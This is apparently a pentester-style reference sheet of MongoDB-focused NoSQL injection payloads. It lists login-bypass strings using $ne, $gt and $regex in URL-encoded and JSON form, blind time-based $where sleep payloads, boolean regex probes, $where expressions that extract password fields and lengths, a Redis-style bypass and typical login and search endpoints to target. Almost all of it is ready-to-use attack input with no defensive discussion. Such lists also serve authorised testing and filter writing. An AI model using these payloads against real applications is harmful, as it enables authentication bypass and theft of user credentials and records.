# NoSQL Injection Reference
Curated NoSQL injection payloads focusing on MongoDB patterns.

## MongoDB Authentication Bypass
**Basic bypass:**
```
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "1==1"}
```

**Login form bypass:**
```
username[$ne]=admin&password[$ne]=secret
username[$regex]=.*&password[$regex]=.*
username[$gt]=&password[$gt]=
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**Array extract:**
```
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
{"username": {"$eq": "admin"}, "password": {"$ne": ""}}
```

## MongoDB Operators
**Comparison operators:**
```
$ne - not equal
$gt - greater than
$gte - greater than or equal
$lt - less than
$lte - less than or equal
$in - in array
$nin - not in array
```

**Logical operators:**
```
$and
$or
$not
$nor
```

**Element operators:**
```
$exists
$type
```

**Evaluation operators:**
```
$regex
$where
$expr
$mod
```

## Blind NoSQL Injection
**Time-based (JavaScript):**
```
{"$where": "sleep(5000)"}
{"$function": "function() { sleep(5000); return true; }"}
```

**Boolean-based:**
```
{"username": {"$regex": "^a"}, "password": {"$regex": "^a"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## Data Exfiltration
**Extract field values:**
```
{"$where": "return tojson(this).match(/password.*?/)"}
{"$where": "Object.keys(this)[0]"}
```

**Array access:**
```
{"field.0": "value"}
{"field.1": "value"}
```

**Size extraction:**
```
{"$where": "this.password.length > 5"}
{"$where": "Object.keys(this).length > 3"}
```

## JSON Operator Injection Examples
**Raw JSON input:**
```json
{"username": {"$ne": "admin"}, "password": {"$ne": ""}}
```

**URL-encoded:**
```
username[$ne]=admin&password[$ne]=secret
username[$regex]=.*&password[$regex]=.*
```

**JSON with operators:**
```json
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
```

## Redis-Style NoSQL
**Authentication bypass:**
```
{"auth": {"$ne": null}}
{"pass": {"$ne": ""}}
```

**Key extraction:**
```
{"key": {"$regex": ".*"}}
```

## Special Characters
**Null byte:**
```
%00{"$ne": ""}
```

**Unicode:**
```
\u0027
\u0022
```

**Quote escaping:**
```
\"$ne\":\"\"
```

## Common Endpoints
**Login endpoints:**
```
POST /login
POST /api/login
POST /api/auth
```

**Search endpoints:**
```
GET /api/users?search={"$ne":""}
POST /api/search
```

**Registration:**
```
POST /api/register
```